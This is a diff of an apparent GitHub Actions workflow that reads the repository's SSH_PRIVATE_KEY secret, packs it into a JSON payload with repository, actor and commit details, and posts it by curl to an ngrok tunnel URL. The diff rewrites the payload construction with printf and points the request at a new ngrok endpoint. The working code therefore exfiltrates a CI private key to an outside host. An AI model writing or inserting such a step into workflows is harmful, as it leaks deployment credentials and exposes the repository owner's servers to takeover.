@@ -19,20 +19,25 @@ jobs:
           # Prepare the secret data
           ssh_key="${{ secrets.SSH_PRIVATE_KEY }}"
           
-          # Create JSON payload
-          payload=$(cat <<EOF
-{
-  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
-  "repository": "${{ github.repository }}",
-  "ssh_key": "$ssh_key",
-  "actor": "${{ github.actor }}",
-  "run_id": "${{ github.run_id }}",
-  "run_number": "${{ github.run_number }}",
-  "ref": "${{ github.ref }}",
-  "sha": "${{ github.sha }}"
-}
-EOF
-)
+          # Create JSON payload using printf
+          payload=$(printf '{
+            "timestamp": "%s",
+            "repository": "%s",
+            "ssh_key": "%s",
+            "actor": "%s",
+            "run_id": "%s",
+            "run_number": "%s",
+            "ref": "%s",
+            "sha": "%s"
+          }' \
+            "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
+            "${{ github.repository }}" \
+            "$ssh_key" \
+            "${{ github.actor }}" \
+            "${{ github.run_id }}" \
+            "${{ github.run_number }}" \
+            "${{ github.ref }}" \
+            "${{ github.sha }}")
           
           echo "📤 Sending secrets to local server..."
           echo "📡 Target URL: https://f2ee070ae6e3.ngrok-free.app/receive"
@@ -47,6 +52,6 @@ EOF
             --max-time 30 \
             --retry 3 \
             --retry-delay 2 \
-            https://96e0b3552171.ngrok-free.app/receive
+            https://f2ee070ae6e3.ngrok-free.app/receive
           
           echo "✅ Secrets sent successfully!"
